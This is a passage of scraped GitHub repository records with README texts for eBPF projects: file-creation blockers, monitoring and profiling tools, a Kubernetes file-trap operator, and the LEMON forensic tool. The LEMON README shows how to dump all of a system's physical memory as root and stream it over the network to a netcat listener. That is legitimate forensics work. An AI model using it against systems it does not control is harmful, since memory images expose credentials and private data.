- **Eunomia-bpf** installed ([GitHub](https://github.com/eunomia-bpf/eunomia-bpf))

### Compile and Load the eBPF Program
```sh
# Clone this repository
git clone https://github.com/YOUR_GITHUB_USERNAME/ebpf-block-file.git
cd ebpf-block-file

# Compile using Eunomia eBPF Compiler (ecc)
ecc block_file_create.c

# Load the eBPF program
ecli run package.json
```
### Try to create file in /etc/test for example with touch comand and you should get:
```
touch: cannot touch 'file': Operation not permitted
```
### Checking Logs
To monitor blocked file creation attempts, use:
```
sudo cat /sys/kernel/debug/tracing/trace_pipe
```
The output should be similar to:
```
touch-2502    [007] ....1   161.355842: bpf_trace_printk: Blocked file creation in /etc/test: file
```

### License
This project is licensed under GPL-2.0."
eurecom-s3/lemon,86,11,86,1,C,eBPF Memory Dump Tool,2025-01-27T10:15:31Z,2025-09-17T16:58:18Z,40,"# LEMON - An eBPF Memory Dump Tool for x64 and ARM64 Linux and Android

LEMON is a Linux and Android memory dump tool that utilizes eBPF to capture the entire physical memory of a system and save it in LiME format, compatible with forensic tools such as Volatility 3.

LEMON is available as a precompiled static binary for x64 and ARM64, leveraging a CO-RE (Compile Once, Run Everywhere) eBPF program. This allows analysts to dump system memory without compiling anything on the target machine, checking for specific compatibility with installed libraries and kernel versions, and without requiring kernel headers. It is particularly useful in scenarios where loading kernel modules is not possible (e.g., due to Secure Boot) or when `{/proc, /dev}/kcore` is unavailable. If CO-RE is not available on the target machine a universal kernel-independent no CO-RE version of lemon can be run on it.

## Usage

Copy the `lemon` binary to the target machine and initiate a memory dump on disk with:

```sh
./lemon.MODE.ARCH -d memory_on_disk.dump
```

For a network dump instead use:

```sh
./lemon.MODE.ARCH -n TARGET_IP -p TARGET_PORT
```
while on the target machine
```sh
nc -l -p TARGET_PORT >  memory_by_net.dump
```

This generates a `memory.dump` file in LiME format, containing all physical memory pages. Since running eBPF programs typically requires root privileges, LEMON must be executed as `root` or with an appropriate `sudo` configuration.
Sometimes LEMON returns reading error on a 2MB block of pages: it is normal and due to KFENCE security infrastructure of the kernel.  

## Build

Precompiled static binaries are available in this repository (check the Github actions tab) or in the release section. Analysts can also compile LEMON themselves, either dynamically or statically. The dynamic version requires the presence of `libbpf`, `libz`, `libelf`, `libzstd` and `libcap` on the target machine, whereas the static version has no external dependencies. Note that the build machine **MUST** have the same CPU architecture as the target.

### Dependencies

To build LEMON, install the necessary dependencies on the analyst's machine. The following command sets up all required packages on an Ubuntu 24.04 system:

```sh
sudo apt install -y git make clang llvm libbpf-dev libcap-dev linux-tools-generic
```

Other distributions provide equivalent packages, which at minimum allow compiling the dynamic version via the system package manager.

### Build Procedure

1. **Clone the repository**

2. **Compile:**

   - Dynamic binary (MODE accepts: core, nocore (for using no CO-RE version based on kernel headers) and nocoreuni (for no CO-RE version using the universal header included in LEMON)):
     ```sh
     make MODE=core
     ```
   - Static binary:
     ```sh
     make MODE=core static
     ```

## Limitations

- The kernel must support eBPF (obviously!).
- Kernel lockdown must not be in confidentiality mode (or must allow `bpf_probe_read_kernel()`).

## TODO

- [X] Support non CO-RE kernels
- [X] Insert checks on kernel versions and ```CONFIG_``` kernel options to extend support
- [X] Implement network dump (TCP)
- [X] Implement dump with reduced granule if page fail to be read
- [X] Introduce support for kernels that do not have uprobes
- [ ] Support other CPU architectures (x32, ARM32, MIPS, PowerPC, POWER, RISC-V)
- [ ] Use of `_stext` in x64 to bypass missing `CONFIG_KALLSYMS_ALL`
- [ ] Bruteforce scanning (?) for page containing same data of  `_stext` page in ARM64 to bypass missing `CONFIG_KALLSYMS_ALL`

## Notes

### eBPF cronology
- Introduction of eBPF: 3.15
- Introduction of Array maps 3.19
- Introduction of kProbe/uProbe support 4.1
- Introduction of tracepoint support (syscalls tracing) 4.7
- Introduction of XDP 4.8
- Android 9 support eBPF: 4.9
- Introduction of BTF 4.18
- Introduction mmap() support for array maps 5.5
- !!! Introduction of read_kernel() 5.5 <==== Minimum Lemon target version
- Introduction of ring_buffer 5.8
- Android 13 support BTF 5.15
- Introduction of SYSCALL program type 5.15
- Introduction of kallsyms() in ebpf 5.16
"
San7o/hive-operator,7,0,7,4,C,Kive is a free and open source eBPF-powered file access monitoring Kubernetes operator. Kivebpf provides a stable API  to place inode-based traps on files and receive alerts when a file is accessed.,2025-02-26T16:57:11Z,2025-08-21T14:12:16Z,120,"# kivebpf

Kivebpf is a free and open source eBPF-powered file access monitoring
Kubernetes operator.

Kivebpf is used by [Koney](https://github.com/dynatrace-oss/koney/) to
place deception policies on kubernetes clusters.

Note that Kivebpf is not yet ready for production use.

# Basic Usage

You can specify a path to monitor and in which containers by
creating a `KivePolicy`. The following is an example policy:

```yaml
apiVersion: kivebpf.san7o.github.io/v1
kind: KivePolicy
metadata:
  labels:
    app.kubernetes.io/name: kivebpf
  name: kive-sample-policy
  namespace: kivebpf-system
spec:
  alertVersion: v1
  traps:
  - path: /secret.txt
    create: true
    mode: 444
    callback: ""http://my-callback.com/alerts""
    matchAny:
    - pod: nginx-pod
      namespace: default
      containerName: ""regex:nginx-.*""
      matchLabels:
        security-level: high
    metadata:
      alert-level: critical
```

This sets up a trap on the path `/secret.txt` in the matched
containers, creating it with `mode` permissions if it does not
exist. The match groups under the `matchAny` field will be matched via
a logical OR, and each field in a match group is matched with a
logical AND. All the match fields are optional, but there must be at
least one match group under `matchAny`.

When a file gets accessed, the operator will generate an `KiveAlert`
and print the information to standard output in json format. The
following is an example alert:

```json
{
  ""kive-alert-version"": ""v1"",
  ""kive-policy-name"": ""kive-sample-policy"",
  ""timestamp"": ""2025-08-02T16:51:19Z"",
  ""metadata"": {
    ""path"": ""/secret.txt"",
    ""inode"": 16256084,
    ""mask"": 36,
    ""kernel-id"": ""2c147a95-23e5-4f99-a2de-67d5e9fdb502""
  },
  ""custom-metadata"": {
    ""alert-level"": ""critical""
  },
  ""pod"": {
    ""name"": ""nginx-pod"",
    ""namespace"": ""default"",
    ""container"": {
      ""id"": ""containerd://0c37512624823392d71e99a12011148db30ba7ea2a74fc7ff8bd5f85bc7b499c"",
      ""name"": ""nginx""
    }
  },
  ""node"": {
    ""name"": ""kive-worker""
  },
  ""process"": {
    ""pid"": 176928,
    ""tgid"": 176928,
    ""uid"": 0,
    ""gid"": 0,
    ""binary"": ""/usr/bin/cat"",
    ""cwd"": ""/"",
    ""arguments"": ""/secret.txt -""
  }
}
```


- `cwd` and `arguments` are currently disabled

If you specify a `callback` in the `KivePolicy`, then the data will be
sent to the URL of the callback through an HTTP POST request.

Please, read the [USAGE](./docs/USAGE.md) document to learn how to use
the operator in more detail. You can find more examples in
[config/samples](./config/samples/).

## Quick deploy

To deploy the operator, first make sure you have `cert-manager`
installed for secure TLS connections.

Note: This dependency is currently required but it should be dropped
in a future release. Additionally, `cert-manager` currently configures
a self-signing issuer: this is not meant to be used on EKS or other
providers, please use Minikube or Kind to test the operator.

```bash
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/latest/download/cert-manager.yaml
```

Then simply install the operator from the [official docker
repository](https://hub.docker.com/repository/docker/giovann103/kivebpf/general):

```bash
kubectl apply -f https://raw.githubusercontent.com/San7o/kivebpf/refs/heads/main/dist/install-remote.yaml
```

## Supported Environments

| Component           | Supported Version(s)      | Notes                                                         |
|---------------------|---------------------------|---------------------------------------------------------------|
| Kubernetes          | v1.33.x minikube or kind  | `cert-manager` on EKS is currently not configured. Support for EKS is in development. |
| Container Runtime   | containerd                | Only `containerd` is supported at the moment.                 |
| Go (for dev build)  | 1.24                      | Required for building the operator.                           |
| Linux Version       | >= 5.10                   | All kernels from 5.10 are supported. Tested on 5.10 and 6.14. |
| Architectures       | x86_64                    | The eBPF program works only on x86_64.                        |

# Development

The [DESIGN](./docs/DESIGN.md) document contains all the information
about the internals of the operator.

Please read the [DEVELOPMENT](./docs/DEVELOPMENT.md) document to build
and get started with Kive's
development. [EBPF-TESTING](./docs/EBPF-TESTING.md) has instructions
to build and test the eBPF program without running the kubernetes
operator. To run a local cluster, take a look at
[k8s-lab](./k8s-lab/README.md) or simply use the script
[registry-cluster.sh](./hack/registry-cluster.sh).

The [status](./docs/status.org) contains information about the current
status of development and future work.
"
nomaderr/ebpf_permission_manager,4,0,4,0,Go,"A lightweight, fast and powerful tool for managing permissions in Linux using eBPF. Protects the system from unauthorized operations by controlling access at the kernel level.",2025-02-24T23:22:24Z,2025-03-13T20:46:03Z,12,"# eBPF Permission Manager

## Overview

`ebpf_permission_manager` is a security tool that uses **eBPF (Extended Berkeley Packet Filter)** to control file system permissions at the kernel level. It enforces restrictions on file creation in specific directories by leveraging **LSM hooks** inside an eBPF program. 

The project consists of:
- **eBPF Program (C)**: Implements logic for restricting file creation based on a **BPF hash map**.
- **User-Space Controller (Go)**: Manages eBPF program lifecycle, updates the permission rules, and interacts with **bpftool**.

## Features

âœ… Restricts file creation in specific directories  
âœ… Uses **eBPF maps** for dynamic rule updates  
âœ… Implements **LSM hooks** (`inode_create`) for access control  
âœ… Supports **hot updates** without restarting the eBPF program  
âœ… Lightweight and fast, running entirely in **kernel space**  

---

## Architecture

### **eBPF Program (C)**

The eBPF program operates at the kernel level, leveraging an **LSM (Linux Security Module) hook** to intercept file creation attempts. 

- It **stores blocked directory paths** in an **eBPF hash map**.
- Uses **BPF core helpers** to inspect file paths during `inode_create`.
- If a match is found, the file creation is **denied (EPERM)**.
- Logs violations to **trace_pipe** for auditing.

#### **eBPF Map Structure**
- **Type:** `BPF_MAP_TYPE_HASH`
- **Key:** `u32` (always `0` since we store a single rule)
- **Value:** `struct blocked_path_t` (parent + child directory)

---

### **User-Space Controller (Go)**

The **Go-based user-space manager** is responsible for:
- **Compiling and loading** the eBPF program (`ecc`, `ecli`)
- **Finding and pinning the BPF map** (`bpftool map pin`)
- **Updating access control rules dynamically** (`bpftool map update`)
- **Logging denied access attempts**  
- **Ensuring compatibility across kernel versions**

---

## Installation

### **Requirements**
- **Linux Kernel â‰¥ 5.8** (eBPF LSM required)
- **bpftool** (`apt install bpftool` or `yum install bpftool`)
- **eBPF Compiler Collection (ECC-AARCH64, ECLI)**
- **Go â‰¥ 1.18** for user-space controller

### **Build & Run**

**Clone the repository**
```bash
git clone https://github.com/yourusername/ebpf_permission_manager.git
cd ebpf_permission_manager


root@debian:/ebpf_permission_manager# go run main.go /opt/folder/
Checking for ecc...
Compile eBPF with ecc...
Run command: ./ecc-aarch64 program.c
Start eBPF with ecli, run package.json...
INFO [faerie::elf] strtab: 0x1014 symtab 0x1050 relocs 0x1098 sh_offset 0x1098
INFO [bpf_loader_lib::skeleton::poller] Running ebpf program...
eBPF-program started!
Find and pin Map eBPF...
Run command: bpftool map show
Found Map ID: 4
Run command: ls /sys/fs/bpf/block_path_map 2>/dev/null
Error: exit status 2
: 
Run command: bpftool map pin id 4 /sys/fs/bpf/block_path_map
Map pinned successfully!
Adding path to eBPF Map: /opt/folder/
Clean eBPF-map before adding new path...
Run command: bpftool map dump pinned /sys/fs/bpf/block_path_map
Map is empty, skip deletion.
Formating path: parent='opt', child='folder'
Prepare bpftool command:
bpftool map update pinned /sys/fs/bpf/block_path_map \
    key hex 00 00 00 00 \
    value hex \
    6f 70 74 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    66 6f 6c 64 65 72 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Executing command: bpftool map update pinned /sys/fs/bpf/block_path_map \
    key hex 00 00 00 00 \
    value hex \
    6f 70 74 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    66 6f 6c 64 65 72 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Path added!
Completed!
root@debian:/ebpf_permission_manager# touch /opt/folder/file
touch: cannot touch '/opt/folder/file': Operation not permitted
root@debian:/ebpf_permission_manager# cp /var/log/boot.log /opt/folder/
cp: cannot create regular file '/opt/folder/boot.log': Operation not permitted"
kube-vm-project/eSwitch,43,4,43,1,Go,A layer 2 switch for VMs powered by eBPF,2025-02-22T14:20:41Z,2025-04-12T18:54:19Z,3,"# eswitch
The eSwitch project is an eBPF ðŸ layer2 switch 

## Description

The eSwitch is a software switch designed to move packets between a set of interfaces and is all powered by eBPF and wrapped in Kubernetes! 

## Getting Started

Use at your own risk, this is a Proof of Concept and will require a lot of work to be stable.

### Prerequisites
- go version v1.23.0+
- docker version 17.03+.
- kubectl version v1.11.3+.
- Access to a Kubernetes v1.11.3+ cluster.

### To Deploy on the cluster
**Build and push your image to the location specified by `IMG`:**

```sh
make docker-build docker-push IMG=<some-registry>/eswitch:tag
```

**NOTE:** This image ought to be published in the personal registry you specified.
And it is required to have access to pull the image from the working environment.
Make sure you have the proper permission to the registry if the above commands donâ€™t work.

**Install the CRDs into the cluster:**

```sh
make install
```

**Deploy the Manager to the cluster with the image specified by `IMG`:**

```sh
make deploy IMG=<some-registry>/eswitch:tag
```

> **NOTE**: If you encounter RBAC errors, you may need to grant yourself cluster-admin
privileges or be logged in as admin.

**Create instances of your solution**
You can apply the samples (examples) from the config/sample:

```sh
kubectl apply -k config/samples/
```

>**NOTE**: Ensure that the samples has default values to test it out.

### To Uninstall
**Delete the instances (CRs) from the cluster:**

```sh
kubectl delete -k config/samples/
```

**Delete the APIs(CRDs) from the cluster:**

```sh
make uninstall
```

**UnDeploy the controller from the cluster:**

```sh
make undeploy
```

## Project Distribution

Following the options to release and provide this solution to the users.

### By providing a bundle with all YAML files

1. Build the installer for the image built and published in the registry:

```sh
make build-installer IMG=<some-registry>/eswitch:tag
```

**NOTE:** The makefile target mentioned above generates an 'install.yaml'
file in the dist directory. This file contains all the resources built
with Kustomize, which are necessary to install this project without its
dependencies.

2. Using the installer

Users can just run 'kubectl apply -f <URL for YAML BUNDLE>' to install
the project, i.e.:

```sh
kubectl apply -f https://raw.githubusercontent.com/<org>/eswitch/<tag or branch>/dist/install.yaml
```

### By providing a Helm Chart

1. Build the chart using the optional helm plugin

```sh
kubebuilder edit --plugins=helm/v1-alpha
```

2. See that a chart was generated under 'dist/chart', and users
can obtain this solution from there.

**NOTE:** If you change the project, you need to update the Helm Chart
using the same command above to sync the latest changes. Furthermore,
if you create webhooks, you need to use the above command with
the '--force' flag and manually ensure that any custom configuration
previously added to 'dist/chart/values.yaml' or 'dist/chart/manager/manager.yaml'
is manually re-applied afterwards.

## Contributing
// TODO(user): Add detailed information on how you would like others to contribute to this project

**NOTE:** Run `make help` for more information on all potential `make` targets

More information can be found via the [Kubebuilder Documentation](https://book.kubebuilder.io/introduction.html)

## License

Copyright 2025.

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

"
dfrojas/bpfluga,16,1,16,0,C,"bpfluga is an agentless eBPF observability tool written in Go that deploys, manages, and detaches eBPF programs via SSH for deep kernel insights with minimal overhead.",2025-02-16T15:27:58Z,2025-07-05T07:57:18Z,9,"<h1>
<p align=""center"">
    <img src=""docs/logo.png"" alt=""Logo"" width=""200"">
  <br>BPFluga
</h1>
<p align=""center"">
  An agentless eBPF observability tool to deploy eBPF programs to remote machines and collect metrics from them at scale.
  </p>
</p>

# About

> [!NOTE]  
> This is my toy and side project to learn eBPF. I'm not an expert in this field (yet?). Use it at your own risk.

BPFluga is an agentless eBPF observability tool designed for modern distributed systems. Built in Go using the cilium/ebpf library.

Inspired by the graceful beluga whale, bpfluga offers a streamlined and efficient solution to monitor and debug systems. Its agentless architecture allows you to deploy, manage, and detach eBPF programs across your infrastructure via simple SSH commands.

# Features

#### Agentless Deployment:
Deploy eBPF programs remotely without installing persistent agents.

#### Dynamic eBPF Management:
Load, pin, and detach eBPF code programatically based on conditions that you define in a declarative way.

#### Visualization:
Visualize your collected metrics in Grafana.

#### RAG:
Use the integrated RAG to answer questions about your collected metrics.


**Once the VM is created:**

Install Go

`sudo snap install go --classic`

Create a symlink to the asm-generic directory, to fix this error:

```
In file included from /usr/include/linux/bpf.h:11:
/usr/include/linux/types.h:5:10: fatal error: 'asm/types.h' file not found
    5 | #include <asm/types.h>
      |          ^~~~~~~~~~~~~
```

`ln -sf /usr/include/asm-generic/ /usr/include/asm`

Also install the following packages:

`go get github.com/cilium/ebpf`
`go get github.com/cilium/ebpf/link`
"
ALEYI17/ebpf-file-monitor,8,1,8,0,C,"A high-performance file access monitoring tool using eBPF, written in Go. Captures real-time file open events with process details (PID, UID, filename, flags, and timestamps). Designed for system observability.",2025-02-25T23:49:40Z,2025-10-09T06:16:10Z,8,"# eBPF File Monitor

## Overview
This project is an **eBPF-based file monitoring tool** that captures system calls such as `openat`, `read`, and `write`. It logs them in a structured and readable format using **Go** in user space and **eBPF** in kernel space.

## Features
- **Real-time system call logging** for file-related operations.
- **Customizable log formatting** using `lipgloss` for better readability.
- **Efficient eBPF integration** for low-overhead system monitoring.
- **Pretty logging** using `charmbracelet/log` and `lipgloss`.
- **Uses `cilium/ebpf` for eBPF program management in user space.**

## Technologies Used
### Kernel Space
- **eBPF**: Used to attach probes to system calls and capture events efficiently.
- **Linux Kernel**: The project runs on Linux and utilizes kernel tracing mechanisms.

### User Space
- **Go**: The primary programming language used for log processing.
- **Lipgloss**: Used for styling log messages with colors.
- **charmbracelet/log**: For structured logging.
- **cilium/ebpf**: Used to interact with eBPF programs in user space.

## Installation & Usage
### Prerequisites
- Linux system with **eBPF** support.
- Go installed (`go version` should return a valid version).

### Steps to Run
1. **Clone the repository:**
   ```sh
   git clone https://github.com/ALEYI17/ebpf-file-monitor.git
   cd ebpf-file-monitor
   ```
2. **Build and Run the Project:**
   ```sh
   go build -o ebpf_file_monitor
   sudo ./ebpf_file_monitor
   ```

## How It Works
- The eBPF program hooks into system calls tracepoints(`openat`, `read`, `write`) to capture events.
- Events are passed from **kernel space** to **user space** via a ring buffer.
- The **Go application** processes and formats logs for readability.
"
pascalbehmenburg/ebpf-perfomant-experiment,4,0,4,0,Rust,Experimenting with performance event tracing in EBPF,2025-02-23T16:13:02Z,2025-08-17T14:29:07Z,2,"# performant

This is an experimental eBPF program that logs cpu performance events, printing the process name, pid and cpu_id for now.

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""'
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package performant --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/performant` can be
copied to a Linux server or VM and run there.
"
yasindce1998/warmor,7,0,7,0,Go,Warmor is a security enforcer that uses eBPF to monitor system calls and applies WebAssembly (WASM)-based policies for workload protection. It is designed to work across multiple platforms while leveraging eBPF for deep system visibility and WASM for portability.,2025-02-17T15:11:03Z,2025-09-30T11:07:13Z,14,"# Warmor: eBPF & WASM-Based Policy Enforcer

<p align=""center"">
  <img src=""https://github.com/user-attachments/assets/55cb3f75-fb55-4537-858d-8c7b94facbc2"" alt=""image-removebg-preview"">
</p>

# âš ï¸ PoC: eBPF & WASM-Based Policy Enforcer

> **Warning:** This project is a **Proof of Concept (PoC)** to explore the feasibility of using **WebAssembly (WASM) for policy execution** and **eBPF for enforcement**. The primary goal is to evaluate performance, cross-platform support, and security capabilities.

## Overview

**Warmor** is an **eBPF-based policy enforcer** that executes **WASM-compiled policies** to secure workloads on **Linux and Windows** environments. It integrates with **Kubernetes** as an **operator** for dynamic security enforcement.

## Features

- âœ… **Cross-platform enforcement** (Linux & Windows)
- âœ… **WASM for policy execution** (Supports Rust & Golang)
- âœ… **eBPF for low-overhead enforcement**
- âœ… **Lightweight and high-performance execution**

## Architecture

Warmor combines **WASM for policy logic** with **eBPF for enforcement**, balancing flexibility with high performance.

### **Components**

1. **WASM Policy Execution**: Policies are compiled to WASM (Rust or Go) and executed dynamically.
2. **eBPF Enforcement**: eBPF hooks enforce security rules at the kernel level.

## Current Progress

### âœ… **What's Done**
- Basic eBPF enforcer setup in Golang
- WASM policy execution using WasmEdge (Rust-based)

### ðŸ”§ **Next Steps**
- Implement Go 1.24 WebAssembly runtime support for policies
- Expand eBPF enforcement capabilities
- Windows eBPF enforcement PoC (exploring eBPF for Windows)
- More robust policy definition framework
- Kubernetes Operator integration
- Prometheus monitoring setup

## Directory Structure

```
warmor/
â”‚â”€â”€ enforcer/              # eBPF enforcer
â”‚   â”œâ”€â”€ main.go            # Entry point
â”‚   â”œâ”€â”€ policy.wasm        # WASM policy module
â”‚   â”œâ”€â”€ runtime/           # WASM runtime integration
â”‚   â”œâ”€â”€ ebpf/              # eBPF program loader
â”‚   â”œâ”€â”€ metrics/           # Monitoring integration
â”‚â”€â”€ deployment/            # Kubernetes manifests
â”‚   â”œâ”€â”€ enforcer.yaml      # Enforcer DaemonSet
â”‚   â”œâ”€â”€ prometheus.yaml    # Prometheus ServiceMonitor
â”‚â”€â”€ docs/                  # Documentation
â”‚â”€â”€ README.md              # Project overview
â”‚â”€â”€ LICENSE                # License file
```

## Getting Started

### **1. Install Dependencies**

Ensure you have **Go 1.24+**, **WasmEdge**, and **eBPF tools** installed.

```sh
go mod tidy
```

### **2. Build and Run the Enforcer**

```sh
go build -o warmor ./enforcer
./warmor
```

### **3. Deploy on Kubernetes**

```sh
kubectl apply -f deployment/enforcer.yaml
```

### **4. Monitor in Grafana**

```sh
kubectl port-forward -n monitoring svc/grafana 3000:80
```

Then access Grafana at `http://localhost:3000`.

## Platform & OS Support

| Platform/OS        | WASM Execution | eBPF Support | Warmor Support |
|--------------------|---------------|-------------|---------------|
| **Linux (x86_64)** | âœ… Yes         | âœ… Yes      | âœ… Fully Supported |
| **Linux (ARM64)**  | âœ… Yes         | âœ… Yes      | âœ… Fully Supported |
| **Linux (RISC-V)** | âš ï¸ Partial    | âš ï¸ Partial  | âš ï¸ Experimental |
| **Windows (x86_64)** | âœ… Yes (WasmEdge) | âš ï¸ Partial (eBPF for Windows) | âš ï¸ Limited |

## License

Warmor is licensed under the **MIT License**.

"
benbaker76/go-profile,28,2,28,0,C,A port of Brendan Gregg's eBPF profile.py application to Golang.,2025-03-15T05:47:11Z,2025-10-06T09:34:15Z,3,"# go-profile

An *incomplete* port of [brendangregg](https://github.com/brendangregg)'s eBPF profiling application [profile.py](https://github.com/iovisor/bcc/blob/master/tools/profile.py) to Golang.

Please read Brendan Gregg's Blog post [Linux 4.9's Efficient BPF-based Profiler](https://www.brendangregg.com/blog/2016-10-21/linux-efficient-profiler.html) for more information.

This project required changes to the Golang standard library to support some features ([debug/elf: add SHT_GNU_VERDEF section parsing](https://github.com/golang/go/issues/63952)). Special thanks to [ianlancetaylor](https://github.com/ianlancetaylor) and [aclements](https://github.com/aclements) for guiding me through the submission process.

## Options

| Option                   | Description                                                                                                 |
|--------------------------|-------------------------------------------------------------------------------------------------------------|
|                          | Duration in seconds (positional argument, default: 99999999)                                                |
| -F                       | Sample frequency in Hz (default: 49)                                                                        |
| -c                       | Sample period, number of events (default: 10)                                                                 |
| -p                       | Profile process with one or more comma-separated PIDs only                                                  |
| -L                       | Profile thread with one or more comma-separated TIDs only                                                   |
| -hash-storage-size       | The number of hash keys that can be stored (default: 40960)                                                   |
| -stack-storage-size      | The number of unique stack traces that can be stored and displayed (default: 16384)                           |
| -C                       | CPU number to run profile on (default: -1)                                                                    |
| -U                       | Show stacks from user space only (no kernel space stacks)                                                   |
| -K                       | Show stacks from kernel space only (no user space stacks)                                                   |
| -d                       | Insert delimiter between kernel/user stacks                                                                 |
| -a                       | Add _[k] annotations to kernel frames                                                                       |
| -I                       | Include CPU idle stacks                                                                                       |
| -f                       | Output folded format, one line per stack (for flame graphs)                                                 |
| -cgroupmap               | Trace cgroups in this BPF map only                                                                          |
| -mntnsmap                | Trace mount namespaces in this BPF map only                                                                 |
| -E                       | Enable flame graph frame generation                                                                         |
| -g                       | File name pattern for flame graph frame generation (default: 'frames/flamegraph%04d.png')                      |
| -T                       | Enable flame graph realtime feed                                                                            |
| -P                       | HTTP path for flame graph realtime feed (default: '/')                                                      |
| -R                       | Port for flame graph realtime feed (default: 9090)                                                            |

## Generate eBPF Go Bindings

To compile the eBPF programs and generate the corresponding Go bindings, run the following command:

```sh
$ BPF_CFLAGS='-D__TARGET_ARCH_x86' go generate ./cmd/profile/
```

## Example
```sh
$ sudo /usr/local/go/bin/go run ./cmd/profile -p 2197 100
Waiting for stack traces for 1m40s...

    [U] 7f4d99a0112d [unknown]
    [U] 7f4d99a0021d __isoc99_fscanf
    -                htop (2197)
        1
    [K] ffffffff853bd36e do_task_stat
    [K] ffffffff853bd36e do_task_stat
    [K] ffffffff853b70ed proc_single_show
    [K] ffffffff853574a0 seq_read_iter
    [K] ffffffff8535792a seq_read
    [K] ffffffff85326855 vfs_read
    [K] ffffffff85326c2f ksys_read
    [K] ffffffff85f22e55 do_syscall_64
    [K] ffffffff86000124 entry_SYSCALL_64_after_hwframe
    [U] 7f4d99ab27e2 read
    [U] 00000040 [unknown]
```

## More Examples

| Command                                   | Description                                                            |
|-------------------------------------------|------------------------------------------------------------------------|
| `./profile`                        | Profile stack traces at 49 Hertz until Ctrl-C                          |
| `./profile -F 99`                  | Profile stack traces at 99 Hertz                                       |
| `./profile -c 1000000`             | Profile stack traces every 1 in a million events                       |
| `./profile 5`                      | Profile at 49 Hertz for 5 seconds only                                 |
| `./profile -f 5`                   | Output in folded format for flame graphs                               |
| `./profile -p 185`                 | Only profile process with PID 185                                      |
| `./profile -L 185`                 | Only profile thread with TID 185                                       |
| `./profile -U`                     | Only show user space stacks (no kernel)                                |
| `./profile -K`                     | Only show kernel space stacks (no user)                                |
| `./profile --cgroupmap mappath`      | Only trace cgroups in this BPF map                                     |
| `./profile --mntnsmap mappath`       | Only trace mount namespaces in the map                                 |
| `./profile -T`                     | Enable flame graph realtime feed (defaults: `http://localhost:9090/`)    |
| `./profile -E`                     | Enable flame graph frame generation (default: `frames/flamegraph%04d.png`) |

## Video

[![Realtime Flame Graph](images/flamegraph.jpg)](https://www.youtube.com/watch?v=LL-KoHnRfSM ""Realtime Flame Graph"")

To generate a video from the generated frames:
```sh
$ ffmpeg -framerate 30 -i ./frames/flamegraph%04d.png flamegraph.mp4
```

## Headers

Note, the headers were copied from the following sources:

```sh
$ git clone https://github.com/cilium/ebpf.git
$ cp ./ebpf/examples/headers/bpf_helpers.h ./headers/bpf
$ cp ./ebpf/examples/headers/bpf_helper_defs.h ./headers/bpf
$ cp ./ebpf/examples/headers/bpf_tracing.h ./headers/bpf
$ cp ./ebpf/btf/testdata/bpf_core_read.h ./headers/bpf
```

## vmlinux.h

`vmlinux.h` was generated as follows:

```sh
$ sudo apt-get install linux-tools-common linux-tools-generic
$ bpftool btf dump file /sys/kernel/btf/vmlinux format c > ./headers/vmlinux.h
```
## Thanks
- [Brendan Gregg](https://www.brendangregg.com) for the original [profile.py](https://github.com/iovisor/bcc/blob/master/tools/profile.py) and [flamegraph.pl](https://github.com/brendangregg/FlameGraph/blob/master/flamegraph.pl).
- [Marsel Mavletkulov](https://github.com/marselester) for his [libbpf-tools](https://github.com/marselester/libbpf-tools) project and [blog](https://marselester.com/tag/bpf.html). I also added [tcpinfo](https://github.com/benbaker76/libbpf-tools/tree/master/cmd/tcpinfo) to `libbpf-tools`.
- [Ian Lance Taylor](https://github.com/ianlancetaylor) and [Austin Clements](https://github.com/aclements) for help submitting changes to the Golang's `debug/elf` standard library to add `SHT_GNU_VERDEF` section parsing.
"
FrancoKurte/rusty-tcp,19,4,19,1,Rust,Implementing TCP/IP in Rust leveraging eBPF/XDP,2025-02-28T17:12:13Z,2025-08-08T20:37:18Z,5,"# Rusty TCP: eBPF-Powered Network Capture Library in Rust

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Rusty TCP is a Rust library developed for network packet capture, leveraging the efficiency of eBPF (Extended Berkeley Packet Filter) and XDP (eXpress Data Path). Currently under active development in its early stages, this library aims to provide a streamlined and robust method for capturing network traffic directly at the kernel level, thereby minimizing overhead and maximizing throughput.

## Overview

